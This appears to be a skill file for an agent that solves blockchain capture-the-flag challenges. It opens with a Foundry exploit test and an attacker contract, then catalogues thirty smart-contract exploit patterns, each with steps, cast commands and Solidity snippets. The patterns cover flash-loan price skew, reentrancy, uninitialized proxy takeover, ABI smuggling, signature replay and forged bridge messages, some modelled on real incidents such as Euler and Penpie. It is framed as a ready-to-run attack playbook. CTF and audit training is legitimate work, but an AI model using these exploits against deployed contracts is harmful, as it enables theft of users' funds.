        vault = new GenericVault(); // + deploy pool/flash, seed liquidity
        vm.deal(attacker, 10 ether);
    }
    function test_Exploit() public {
        vm.startPrank(attacker);
        Attacker a = new Attacker(address(vault), address(pool), address(flash));
        a.pwn{value: 1 ether}();
        vm.stopPrank();
        assertTrue(vault.isSolved(), "not solved");
    }
}
contract Attacker {
    GenericVault v; IPool p; FlashPool f; bool e;
    constructor(address _v, address _p, address _f) { v = GenericVault(_v); p = IPool(_p); f = FlashPool(_f); }
    function pwn() external payable { f.flashloan(5 ether); }
    function onFlashLoan(uint256 amt, uint256 fee, bytes calldata) external returns (bytes32) {
        p.swapForSkew(amt);            // p0 -> p1
        v.mintShares(1 ether);         // excess at p1
        p.swapBack();                  // restore
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    receive() external payable { if (!e) { e = true; v.claimRewards(); } }
}
```

`Reasoning Checkpoint`: win-condition assert + double re-run green +
artifact list → validation-handoff (technique-only bundle).


## Writeup-Distilled Patterns (W1..W30)

Distilled from `knowledge/writeups_mined/blockchain_manifest.md` (422 writeups).
Read `skills/blockchain/SKILL.md` Phase 1-3 first; these patterns are NEW chains
that only apply after the base hypotheses are dead or point cross-contract.
Each pattern: recognition signals → exact steps → snippet → pitfall → sources.

### W1. ERC4626 donation breaks share invariant (Unstoppable shape)

- Signals: `convertToShares(totalSupply) != totalAssets()` guard in `flashLoan`; `totalAssets()` as raw `balanceOf`; monitor contract pausing on loan failure.
- Steps: 1. read `totalSupply` vs `asset.balanceOf(vault)`; 2. `token.transfer(vault, dust)` directly (no mint); 3. loan now reverts `InvalidBalance`; monitor pauses.
- Snippet: `cast call $V "totalSupply()(uint256)"; cast send $T "transfer(address,uint256)" $V 1 --private-key $K --rpc-url $RPC`
- Pitfall: donating via `deposit()` mints shares and keeps invariant; must be a raw transfer.
- Sources: [goodhacker Unstoppable](https://goodhacker.hashnode.dev/damn-vulnerable-defi-v4-01-unstoppable), [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [DeFiHackLabs writeup](https://defihacklabs.substack.com/p/damn-vulnerable-defi-v4-writeup)

### W2. ERC777 `tokensReceived` splits send from burn (WETH10 shape)

- Signals: `withdrawAll()` sends ETH first, burns shares after; no `nonReentrant`; ERC777 hook names in imports.
- Steps: 1. attacker `receive()` moves its WETH10 to a third address mid-`withdrawAll`; 2. `_burnAll()` burns 0; 3. pull tokens back, repeat until ETH drained.
- Snippet: `grep -rHn 'tokensToSend\|tokensReceived\|withdrawAll\|_burnAll' src/`
- Pitfall: hook only fires for ERC777/ERC1820-registered recipients; plain EOA attacker never reenters.
- Sources: [lmanini QuillCTF](https://github.com/lmanini/QuillCTF-solutions), [Omsify QuillCTF](https://github.com/Omsify/QuillCTF-Solutions), [yAudit fork bugs](https://github.com/yAudit/defi-fork-bugs)

### W3. Fee-on-transfer dust harvest (Grains-of-Sand shape)

- Signals: token charges fee per transfer; `withdrawToken(token, 1)` allowed with tiny amounts; order-fill then withdraw flow.
- Steps: 1. fill orders to hold balance; 2. loop ~1000x 1-wei `withdrawToken` so the store pays the fee each time; 3. batch the loop call ~11x; 4. final full `withdrawToken`.
- Snippet: `for (uint i=0;i<1000;i++) store.withdrawToken(tok,1); // one tx, fee accrues to caller`
- Pitfall: per-tx gas caps the loop; split across repeated calls and assert monotonic gain.
- Sources: [zellic ParadigmCTF](https://www.zellic.io/blog/paradigmctf-challenges-writeup), [faith2dxy writeup](https://faith2dxy.xyz/2023-10-30-paradigmctf-challenges-writeup/2023-10-30-paradigmctf-challenges-writeup/), [fuzzland paradigm.md](https://github.com/fuzzland/writeup/blob/master/paradigm.md)

### W4. Double-entrypoint token (one token, two impls)

- Signals: token forwards to an underlying or legacy copy; `transfer`/`transferFrom` behave differently per entrypoint; forwarder contract holds balances.
- Steps: 1. find which entrypoint the victim credits; 2. move funds through the other entrypoint; 3. victim accounting never debits; sweep via detection-bot or withdraw path.
- Snippet: `grep -rHn 'forwarder\|underlying\|doubleEntrypoint\|delegateTo' src/`
- Pitfall: fixing the bot to watch both entrypoints kills it; confirm which one the monitor misses first.
- Sources: [erhant challenges](https://github.com/erhant/ethernaut-evm-challenges), [yAudit fork bugs](https://github.com/yAudit/defi-fork-bugs), [ciaranmcveigh5 foundry](https://github.com/ciaranmcveigh5/ethernaut-x-foundry)

### W5. PuzzleWallet multicall deposit double-count

- Signals: proxy + `multicall(bytes[])` + `deposit()` payable + `execute()` on balances mapping; admin slot equals owner slot.
- Steps: 1. `proposeNewAdmin(attacker)` (anyone can propose); 2. `addToWhitelist(attacker)` (now-admin-gated passes); 3. nested `multicall([deposit, deposit])` with one `msg.value` counts twice; 4. `execute(attacker, balance*2, "")` drains; 5. `setMaxBalance` to pass check.
- Snippet: `vault.multicall{value:1 ether}(abi.encodePacked(dep,dep)) // 1 ETH credited twice`
- Pitfall: inner `deposit()` must be reached via `delegatecall` self-call for `msg.value` reuse; direct calls split value.
- Sources: [erhant challenges](https://github.com/erhant/ethernaut-evm-challenges), [az0mb13 foundry](https://github.com/az0mb13/ethernaut-foundry/), [ciaranmcveigh5 foundry](https://github.com/ciaranmcveigh5/ethernaut-x-foundry)

### W6. Uninitialized UUPS implementation takeover (Motorbike shape)

- Signals: EIP-1967 impl slot set; `Engine`/`implementation` contract has `initialize()` or `upgrader` without `_disableInitializers` in constructor.
- Steps: 1. `cast implementation $PROXY` to get impl; 2. call `initialize(attacker)` on the impl directly; 3. `upgradeToAndCall(attackerImpl)` or `selfdestruct` path; 4. engine bricked / funds routed.
- Snippet: `cast implementation --rpc-url $RPC $PROXY; cast send $IMPL "initialize(address)" $ME --private-key $K --rpc-url $RPC`
- Pitfall: initializing the proxy is not enough; the impl itself must be uninitialized. Verify with `cast storage` on impl slot 0.
- Sources: [erhant challenges](https://github.com/erhant/ethernaut-evm-challenges), [az0mb13 foundry](https://github.com/az0mb13/ethernaut-foundry/), [ciaranmcveigh5 foundry](https://github.com/ciaranmcveigh5/ethernaut-x-foundry)

### W7. Counterfactual Safe backdoor (Backdoor shape)

- Signals: wallet factory + `CREATE2` + `setup()` with delegatecall to initializer; beneficiaries pre-funded before wallets exist.
- Steps: 1. predict each Safe address from deployer nonce / salt; 2. craft `setup()` calldata that approves a malicious module; 3. singleton `delegatecall`s your module at creation; 4. module sweeps tokens on first tx.
- Snippet: `cast compute-address --nonce $N $DEPLOYER; grep -rHn 'setup(\|createProxyWithNonce\|CREATE2' src/`
- Pitfall: module must be approved inside the same creation tx; post-creation `execTransaction` needs threshold signatures.
- Sources: [DeFiHackLabs writeup](https://defihacklabs.substack.com/p/damn-vulnerable-defi-v4-writeup), [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [pkqs90 part-3](https://pkqs90.github.io/ctf/damn-vulnerable-defi-v3-solutions-part-3/)

### W8. ABI-smuggled selector (SelfAuthorizedVault `execute` shape)

- Signals: `execute(target, actionData)` reads a selector at a fixed calldata offset for auth, then runs the dynamic `actionData` blob.
- Steps: 1. place the allowed `withdraw` selector at the checked offset (byte 100); 2. set data-offset `0x80` to smuggled `sweepFunds` payload; 3. single low-level `call` runs the forbidden action with a permitted check.
- Snippet: `payload = executeSelector + paddedTarget + 0x80 + emptyWord + withdrawPadded + len + sweepFundsCalldata`
- Pitfall: hand-packing must match `calldataload` positions exactly; test offsets against the `ABISmuggling.t.sol` PoC before editing.
- Sources: [SunWeb3Sec ABISmuggling.t.sol](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions/blob/main/test/abi-smuggling/ABISmuggling.t.sol), [shamadrian solutions](https://github.com/shamadrian/Damn-Vulnerable-Defi-Solutions), [siddharth9903 solutions](https://github.com/siddharth9903/damn-vulnerable-defi-v4-solutions)

### W9. Trusted-forwarder `_msgSender` spoof (Naive-Receiver shape)

- Signals: `_msgSender()` returns last-20-bytes of `msg.data` when caller is the forwarder; `multicall` + `withdraw` + fixed-fee flash loans.
- Steps: 1. batch 10x zero-amount flash loans via `multicall` to burn the receiver's fee balance; 2. append deployer address bytes to a `withdraw(all, recovery)` call; 3. wrap both in one signed forwarder request.
- Snippet: `abi.encodePacked(encodeCall(withdraw,(bal,rec)), bytes32(uint160(deployer))) // spoofed sender tail`
- Pitfall: tail must be exactly 20 bytes and forwarder must be `trustedForwarder`; fresh `vm.sign` per nonce.
- Sources: [0xjesstech guide](https://medium.com/@0xjesstech/its-so-damn-vulnerable-defi-v4-a-guide-to-solve-challenge-2-40591b3271a9), [RealJohnnyTime solutions](https://github.com/RealJohnnyTime/damn-vulnerable-defi-v4-solutions), [CanonicalJP walkthrough](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough)

### W10. Flash-loan inner arbitrary call (Truster shape)

- Signals: `flashLoan(0, borrower, target, data)` does `target.functionCall(data)` with only a balance-repaid check.
- Steps: 1. encode `approve(attacker, poolBalance)` as `data` with target = token; 2. execute loan in attacker constructor (atomic); 3. `transferFrom(pool, recovery, all)`.
- Snippet: `pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)",address(this),bal))`
- Pitfall: constructor-atomicity matters; a two-tx path can be front-run. Assert `balanceOf(pool)==0` in-test.
- Sources: [RealJohnnyTime solutions](https://github.com/RealJohnnyTime/damn-vulnerable-defi-v4-solutions), [CanonicalJP walkthrough](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough), [0x71pp17 analysis](https://github.com/0x71pp17/damn-vulnerable-defi_solutions_and_code_analysis)

### W11. Deposit-counts-as-repayment (Side-Entrance shape)

- Signals: flash repayment check is `address(this).balance < balanceBefore`; pool exposes `deposit()` crediting internal balances.
- Steps: 1. `flashLoan(all)`; 2. in `execute()` callback `deposit{value:msg.value}()`; 3. balance check passes while you hold deposit credit; 4. `withdraw()` to recovery.
- Snippet: `function execute() external payable { pool.deposit{value: msg.value}(); }`
- Pitfall: deposit and withdraw are in different tx positions; withdraw only after the loan tx finalizes the credit.
- Sources: [RealJohnnyTime solutions](https://github.com/RealJohnnyTime/damn-vulnerable-defi-v4-solutions), [CanonicalJP walkthrough](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough), [0x71pp17 analysis](https://github.com/0x71pp17/damn-vulnerable-defi_solutions_and_code_analysis)

### W12. Same-round reward snapshot replay (Rewarder shape)

- Signals: rewards distributed per round/snapshot; `depositToken` + `claimRewards` callable in any order within the round.
- Steps: 1. flash-mint or flash-borrow a large deposit inside the round; 2. claim before the snapshot finalizes; 3. withdraw + repay same tx; keep the distribution.
- Snippet: `vm.roll(block.number); flashDeposit(); claim(); withdraw(); repay(); // one block`
- Pitfall: if the snapshot is block-delayed (v4 rework), single-tx replay dies; check snapshot timing in Phase 3 first.
- Sources: [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [0x71pp17 analysis](https://github.com/0x71pp17/damn-vulnerable-defi_solutions_and_code_analysis), [CanonicalJP walkthrough](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough)

### W13. Flash-governance queue-then-warp (Selfie shape)

- Signals: governance token with `delegate()`; pool offers flash loans; timelock queues actions with a delay; `emergencyExit` exists.
- Steps: 1. flash-borrow >50pct supply; 2. in `onFlashLoan`: `delegate(self)` then `queueAction(emergencyExit(recovery))`; 3. repay; 4. `vm.warp(+2 days); executeAction(id)`.
- Snippet: `token.delegate(address(this)); gov.queueAction(address(pool),0,abi.encodeWithSignature("emergencyExit(address)",rec));`
- Pitfall: delegation must precede the vote snapshot in the same callback; queuing before delegating fails quorum.
- Sources: [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [CanonicalJP walkthrough](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough), [juancito solutions](https://github.com/0xjuancito/damn-vulnerable-defi-solutions/)

### W14. Leaked-key median-oracle flip (Compromised shape)

- Signals: price is median of N trusted reporters; challenge text leaks N-1 keys; `postPrice` callable per reporter; buy/sell against median.
- Steps: 1. derive reporter addresses from leaked material; 2. `postPrice(0)` from majority to drag median to ~0; 3. `buyOne{value:1}()`; 4. restore `postPrice(999 ether)`; 5. `sellOne` for full balance.
- Snippet: `vm.prank(repA); oracle.postPrice("DVNFT",0); // repeat for majority, then buy, restore, sell`
- Pitfall: median needs strict majority; one key is never enough for N=3. Verify sort logic before assuming average.
- Sources: [0xnick HackMD](https://hackmd.io/@0xnick/H1uwjFiLJx), [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [0x71pp17 analysis](https://github.com/0x71pp17/damn-vulnerable-defi_solutions_and_code_analysis)

### W15. V2-pair spot borrow (Puppet-V2 shape)

- Signals: lending pool quotes via UniswapV2 reserves without TWAP; `calculateDepositRequired` reads the pair directly; low liquidity.
- Steps: 1. dump attacker tokens into the V2 pair; 2. read collapsed `quote`; 3. `borrow(poolBalance)` with tiny collateral; 4. to recovery.
- Snippet: `cast call $PAIR "getReserves()(uint112,uint112,uint32)"; cast call $POOL "calculateDepositOfWETHRequired(uint256)(uint256)" $BAL`
- Pitfall: V2 `skim`/`sync` can reset manipulation mid-tx; complete skew-to-borrow without intermediate syncs.
- Sources: [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [shamadrian solutions](https://github.com/shamadrian/Damn-Vulnerable-Defi-Solutions), [DeFiHackLabs writeup](https://defihacklabs.substack.com/p/damn-vulnerable-defi-v4-writeup)

### W16. Marketplace buyMany + bounty reentry (Free-Rider shape)

- Signals: NFT marketplace `buyMany` + separate bounty distributor paying per-NFT; ERC777 payment token; removal of sold NFTs after payout loop.
- Steps: 1. flash-buy all listed NFTs in one `buyMany`; 2. 777 hook reenters bounty claim before `remove` flags; 3. bounty paid twice on same NFTs; 4. repay flash, keep bounty + NFTs.
- Snippet: `forge test --match-test test_Exploit -vvvv | grep -i 'tokensReceived' // assert hook frame exists`
- Pitfall: if the hook never fires (no ERC1820 registration), the chain silently becomes a plain buy; assert the callback frame first (F7).
- Sources: [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [pkqs90 part-3](https://pkqs90.github.io/ctf/damn-vulnerable-defi-v3-solutions-part-3/), [ret2basic web3-ctf](https://ret2basic.gitbook.io/ctfwriteup/web3-ctf)

### W17. Timelock execute-before-check + upgrade (Climber shape)

- Signals: timelock `execute()` callable by anyone, runs calls BEFORE `ReadyForExecution` check; self-admin role; UUPS vault owned by timelock.
- Steps: 1. bundle `[updateDelay(0), transferOwnership(me), grantRole(PROPOSER, attacker), scheduleSelf]`; 2. `execute()` runs all then self-schedules to pass the trailing check; 3. as owner upgrade vault to `sweepFunds`-to-attacker impl; 4. sweep.
- Snippet: `timelock.execute(targets, values, dataElements, salt) // 4-op bundle, check passes post-execution`
- Pitfall: the schedule-callback must reproduce the exact op-id inputs; route it through a middleman contract, not inline.
- Sources: [dacian Climber](https://dacian.me/damn-vulnerable-defi-climber-solution), [stermi Climber](https://stermi.xyz/blog/damn-vulnerable-defi-challenge-12-solution-climber), [pkqs90 part-3](https://pkqs90.github.io/ctf/damn-vulnerable-defi-v3-solutions-part-3/)

### W18. Wallet replay + impl takeover (Wallet-Mining shape)

- Signals: Safe wallets at predictable CREATE2 addresses; UUPS `AuthorizerUpgradeable` impl without `_disableInitializers`; `can()` via `staticcall`.
- Steps: 1. compute counterfactual addresses, fill placeholders; 2. `init()` the impl directly to seize ownership; 3. `upgradeToAndCall` a permissive impl; 4. `selfdestruct`-aware `can()` bypass lets wards get paid; single-tx settlement.
- Snippet: `cast storage $AUTH 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc // impl addr`
- Pitfall: needs a mainnet fork for the Safe singleton factory; pin `--fork-block-number` or module addresses drift (F1).
- Sources: [DeFiHackLabs writeup](https://defihacklabs.substack.com/p/damn-vulnerable-defi-v4-writeup), [mikle97pir solutions](https://mikle97pir.github.io/damn-vulnerable-defi-solutions/), [pkqs90 part-3](https://pkqs90.github.io/ctf/damn-vulnerable-defi-v3-solutions-part-3/)

### W19. Fractional-NFT shard ordering (Shards shape)

- Signals: `MerkleDistributor` + fractionalized NFT vault + `fill`/`exit`/`redeem` with shard accounting separate from underlying.
- Steps: 1. claim shards via merkle proof; 2. `fill` ordering that double-counts fractional share; 3. `exit`/`redeem` before accounting sync; route underlying to recovery.
- Snippet: `grep -rHn 'MerkleDistributor\|fill(\|exit(\|redeem\|shard' src/`
- Pitfall: proof encoding (`encodePacked` vs `encode`, leaf index inclusion) must match `verify` verbatim or claims revert.
- Sources: [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [DeFiHackLabs writeup](https://defihacklabs.substack.com/p/damn-vulnerable-defi-v4-writeup), [shamadrian solutions](https://github.com/shamadrian/Damn-Vulnerable-Defi-Solutions)

### W20. Curve LP-oracle skew loop (Conic/Curvy shape)

- Signals: lender prices LP collateral via `get_virtual_price` / Curve oracle; attacker can mint LP at skewed rate; deposit/withdraw loop.
- Steps: 1. flash 20k stETH-scale capital; 2. imbalanced Curve swaps shift LP mint rate; 3. mint excess LP, deposit as collateral, borrow; 4. repeat 3-5x before rate normalizes.
- Snippet: `lendingPool.calculateDepositOfWETHRequired(bal) // log pre/post skew, require p1/p0 > fee+gas`
- Pitfall: newly added oracle contracts may sit outside audit scope (Conic V2); diff oracle version used vs audited one.
- Sources: [BlockAudit Conic](https://blockauditreport.medium.com/conic-finance-a-post-mortem-of-3-2-million-de-fi-attack-blockaudit-bb014dec88f9), [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [yAudit fork bugs](https://github.com/yAudit/defi-fork-bugs)

### W21. Dual-accounting withdrawal race (Withdrawal shape)

- Signals: vault tracks ETH and ERC20 legs separately; `approve`/`transferFrom` plus migration hook; recipient update mid-flow.
- Steps: 1. over-approve the migration path; 2. trigger recipient migration; 3. withdraw both legs against the same credit; funds land in recovery.
- Snippet: `grep -rHn 'migrate\|recipient\|approve\|transferFrom' src/ | head -n 30`
- Pitfall: leg ordering is exact; withdrawing the synced leg first reverts the second. Dry-run pre/post balances per leg.
- Sources: [SunWeb3Sec v4](https://github.com/SunWeb3Sec/damn-vulnerable-defi-v4-solutions), [DeFiHackLabs writeup](https://defihacklabs.substack.com/p/damn-vulnerable-defi-v4-writeup), [siddharth9903 solutions](https://github.com/siddharth9903/damn-vulnerable-defi-v4-solutions)

### W22. DVM open-init + callback re-init (Dodont shape)

- Signals: DODO `DVM` clone-factory template; `init()` callable by anyone; `flashLoan` callback into attacker contract.
- Steps: 1. flash-borrow base+quote; 2. in `DVMFlashLoanCall` deploy attacker quote tokens, fund the DVM, call `init(attacker, t1, t2, ...)`; 3. DVM now quotes attacker tokens; drain via skewed trade.
- Snippet: `dvm.flashLoan(bBase, bQuote, address(this), hex"11") // re-init inside callback`
- Pitfall: init params (lp fee, maintainer, trade开关) must keep the pool tradable; a dead pool strands the flash repayment.
- Sources: [fuzzland paradigm.md](https://github.com/fuzzland/writeup/blob/master/paradigm.md), [bentobox19 paradigm-ctf](https://github.com/bentobox19/paradigm-ctf/), [paradigm-ctf-2023 Dodont](https://github.com/paradigmxyz/paradigm-ctf-2023/tree/main/dodont/challenge/project)

### W23. ERC20/ERC721 selector clash (Token-Locker shape)

- Signals: locker treats positions by function selector; UniswapV3 NFT position manager shares 4-byte selectors with ERC20 paths; `lock()` accepts the NFT as a fungible.
- Steps: 1. mint/buy a V3 position NFT; 2. `lock()` it through the ERC20-typed path; 3. accounting credits fungible value for a non-fungible; 4. unlock/withdraw value loop.
- Snippet: `cast sig "transfer(address,uint256)"; cast selectors $NFT_BYTECODE // diff overlap`
- Pitfall: only specific selector pairs collide; enumerate both ABIs with `cast selectors` before assuming clash.
- Sources: [fuzzland paradigm.md](https://github.com/fuzzland/writeup/blob/master/paradigm.md), [aicoin Salus report](https://www.aicoin.com/en/article/390217), [bentobox19 paradigm-ctf](https://github.com/bentobox19/paradigm-ctf/)

### W24. Off-chain cache-key collision (Suspicious-Charity shape)

- Signals: solver/bot script caches pairs by `string(uint8)` name; names >79 collide; price served from stale cache entry.
- Steps: 1. create ~78 junk pairs to shift naming; 2. create low-liquidity high-price pair (gets cached); 3. create high-liquidity low-price pair reusing the collided key; 4. bot quotes the stale expensive price; arbitrage it.
- Snippet: `grep -rHn 'cache\|string(\|pairFor\|getPair' script/ bot/ | head -n 30`
- Pitfall: this is an off-contract bug; escalate to `/rev` bot-analysis if the caching lives in JS/python, then exploit on-chain.
- Sources: [fuzzland paradigm.md](https://github.com/fuzzland/writeup/blob/master/paradigm.md), [bentobox19 paradigm-ctf](https://github.com/bentobox19/paradigm-ctf/), [paradigm-ctf-infrastructure](https://github.com/paradigmxyz/paradigm-ctf-infrastructure)

### W25. Donate-to-reserves without solvency check (Euler shape)

- Signals: `donateToReserves()` moves eTokens without the liquidity check that `transfer` enforces; self-liquidation pays a discount on D/E ratio.
- Steps: 1. Balancer flash wstETH; 2. `deposit` + `mint(15x)` eTokens; 3. `donateToReserves(3x)` to crater health; 4. `liquidate(self)` at inflated discount; 5. `withdraw` + repay flash, keep spread.
- Snippet: `eToken.deposit(0,amt); eToken.mint(0,amt*15); eToken.donateToReserves(0,amt*3); liquidator.liquidate();`
- Pitfall: economic-incentive bugs never show in static analysis; model the discount formula numerically before sizing the flash amount.
- Sources: [zellic Euler analysis](https://www.zellic.io/blog/euler-finance-exploit-analysis), [Zellic Euler PoC](https://github.com/Zellic/poc-hacks/blob/main/EulerFinance/euler.sol), [CertiK lending retrospective](https://www.certik.com/blog/lending-contract-exploits-a-retrospective)

### W26. Harvest balance-delta with malicious market (Penpie shape)

- Signals: `batchHarvestMarketRewards()` snapshots before/after an external `redeemRewards()` with NO `nonReentrant`; permissionless market registration via factory.
- Steps: 1. deploy malicious SY token + Pendle market, register it; 2. flash-borrow real assets; 3. harvest call triggers SY callback which reenters `depositMarket()` injecting real LP as fake rewards; 4. `multiclaim` the inflated delta; 5. redeem + repay.
- Snippet: `grep -rHn 'redeemRewards\|batchHarvest\|getRewardTokens\|nonReentrant' src/ // harvest missing guard = live`
- Pitfall: per-function guards do not stop cross-function reentry; only a global lock or CEI ordering fixes it. Confirm guard asymmetry first.
- Sources: [Zokyo Penpie post-mortem](https://zokyo.io/blog/penpie-postmortem/), [CertiK lending retrospective](https://www.certik.com/blog/lending-contract-exploits-a-retrospective), [yAudit fork bugs](https://github.com/yAudit/defi-fork-bugs)

### W27. Exit-pool callback price window (Sturdy/Balancer shape)

- Signals: oracle `getAssetPrice()` reads Balancer `getRate()` (V/S math); `exitPool()` sends ETH triggering attacker `receive()` BEFORE internal balances update.
- Steps: 1. Aave flash 50k wstETH + 60k WETH; 2. join Balancer pool, deposit LP as collateral; 3. `exitPool()`; inside `receive()`: `setUserUseReserveAsCollateral(off)` passes on inflated price; 4. borrow + self-liquidate; repeat 5x.
- Snippet: `receive() external payable { if (nonce++==0) lendingPool.setUserUseReserveAsCollateral(coll,false); }`
- Pitfall: Balancer patched Vault reentrancy in Feb-2023 but `view` reads stayed exposed; check the oracle reads a view, not a guarded mutating fn.
- Sources: [EigenPhi Sturdy forensics](https://eigenphi.substack.com/p/sturdy-finance-exploit-forensic-analysis), [kismp Sturdy analysis](https://github.com/kismp123/DeFi-Security-Incident/blob/main/2023/2023-06-12_SturdyFinance_ReadOnlyReentrancy_ETH.md), [OAK Cygnus read-only](https://onchainattack.org/document/examples/2024-03-cygnus-finance-read-only-reentrancy/)

### W28. Cross-chain / pre-sign signature replay (Phi shape)

- Signals: `signatureClaim`/`createArt` verify ECDSA without binding `block.chainid`, submitter, or full config; factory callable directly bypassing the chainid-substituting path.
- Steps: 1. capture a valid signature on a cheap chain/art; 2. call factory directly on the valuable chain with same sig; 3. claim premium art / frontrun `createArt` with attacker royalty config.
- Snippet: `grep -rHn 'ecrecover\|DOMAIN_SEPARATOR\|block.chainid\|nonces' src/ // missing chainid+nonce+binding = live`
- Pitfall: EIP-712 domain may look correct while one entry path skips substitution; test the direct factory call, not just the documented path.
- Sources: [Code4rena Phi report](https://code4rena.com/reports/2024-08-phi), [Code4rena PoolTogether VRF/salt notes](https://code4rena.com/reports/2023-07-pooltogether), [minaminao multisig topic](https://github.com/minaminao/ctf-blockchain)

### W29. Huff ecrecover-callback steering (Black-Sheep shape)

- Signals: Huff contract with `CHECKVALUE` (double-back under 16 wei) + `CHECKSIG` calling `address(0x1)` ecrecover precompile + `WITHDRAW` via `selfbalance`.
- Steps: 1. compile with `huffc`, step in EVM playground with 15-wei value; 2. find the `iszero iszero noauth jumpi` gate depends on the CALL return, not the sig; 3. fallback reverts only when `msg.value==30 wei` to zero the return; 4. withdraw full balance.
- Snippet: `fallback() payable external { if (msg.value == 30 wei) revert(); } // steers iszero gate`
- Pitfall: Huff has no source-maps; trace by hand with encoded `withdraw(bytes32,uint8,bytes32,bytes32)` calldata.
- Sources: [ashiq Black-Sheep](https://ashiq.co.za/posts/Paradigm-CTF-Writeups/), [bentobox19 paradigm-ctf](https://github.com/bentobox19/paradigm-ctf/), [paradigm-ctf-2023 Black-Sheep](https://github.com/paradigmxyz/paradigm-ctf-2023/tree/main/black-sheep/challenge/project)

### W30. Forged cross-chain message (Enterprise shape)

- Signals: bridge `sendRemoteMessage(chainId, target, data)` callable by anyone; L1 executes decoded calls without origin allowlist.
- Steps: 1. encode `transfer(attacker, amount)` as message data; 2. `sendRemoteMessage(l1Chain, token, data)` from L2; 3. relayer executes on L1; 4. verify via `cast call balanceOf` on L1.
- Snippet: `bridge.sendRemoteMessage(78704, address(token), abi.encodeWithSignature("transfer(address,uint256)",me,amt))`
- Pitfall: token vs bridge address mixups and L1/L2 RPC swaps silently succeed-but-do-nothing; assert post-state on the correct RPC.
- Sources: [ashiq Enterprise](https://ashiq.co.za/posts/Paradigm-CTF-Writeups/), [fuzzland paradigm.md](https://github.com/fuzzland/writeup/blob/master/paradigm.md), [zellic ParadigmCTF](https://www.zellic.io/blog/paradigmctf-challenges-writeup)

### Pattern index (extended PoCs)

| IDs | File |
|---|---|
| W8 ABI smuggling, W17 Climber, W18 Wallet-Mining, W20 Curve-LP-oracle, W22 DVM re-init | `techniques/writeup-patterns-1.md` |
| W23 selector clash, W24 cache collision, W25 Euler donate, W26 Penpie harvest, W27 Balancer window | `techniques/writeup-patterns-1.md` |
| W31 dispute-delay, W32 inbox init, W33 portal value, W34 paymaster, W35 UserOp replay, W36 sandwich, W37 mempool-neg, W38 restake-drift, W39 credential, W40 solver-bundle, W41 bridge-msg, W42 dual-ledger, W43 TWAP-warp, W44 gov-warp, W45 7702, W46 rebase-drift | `techniques/writeup-patterns-r2-1.md` |
| W47 Vyper-lock, W48 concat-zero, W49 neg-offset, W50 Cairo-merge, W51 felt-acct, W52 no-signer, W53 PDA-seed, W54 prog-confusion, W55 Move-entry, W56 Sui-PTB, W57 CosmWasm, W58 fuzz-trio, W59 FV-escape, W60 contest-reuse, W61 incident-port, W62 rate-window | `techniques/writeup-patterns-r2-2.md` |

`Reasoning Checkpoint`: pattern ID (W1-W30) + matched signals + snippet dry-run result → gated exploit or next pattern.

## EASY-FIRST ladder (2026 training refresh — run BEFORE any W-pattern, ≤20 min)
1. Read ALL `public` state vars directly: `cast call $T "isSolved()(bool)" --rpc-url $RPC`; `flag()`/`secret()` getters often exist — call them before exploiting anything.
2. `tx.origin` auth → bounce via attack contract (`msg.sender != tx.origin` fails only for EOAs).
3. `call{value}` BEFORE `balances-=x` → classic reentrancy: `receive(){ if (bal>=amt) target.withdraw(amt); }`.
4. solc<0.8 arithmetic → overflow/underflow (`transfer` 1 wei to underflow balance); try `cast send` dust amounts.
5. `owner==you` / `balance==0` goals → check `changeOwner`/`claim`/`contribute` for missing access control before writing exploit scaffolds.

## R4 field patterns (browser-swarm 2026 — DamnVulnerableDeFi full-set coverage)
- Per-challenge one-liners: Unstoppable → direct ERC4626 transfer breaks `convertToShares`; SideEntrance → deposit INSIDE the flashloan callback; Truster → arbitrary-call approve; Selfie → flashloan governance snapshot + timelock queue; Puppet → TWAP-skew borrow.
- Harness: Foundry `prank`/`deal` cheatcodes per challenge; invariant-fuzz rounding direction (dust-wei drift) with Echidna/Medusa.
- EVM storage reads: on-chain guessing games → read the slot directly, XOR out the key (no exploit needed).

Deep-read bodies (8 complete articles): techniques/r5-deep-reads.md.
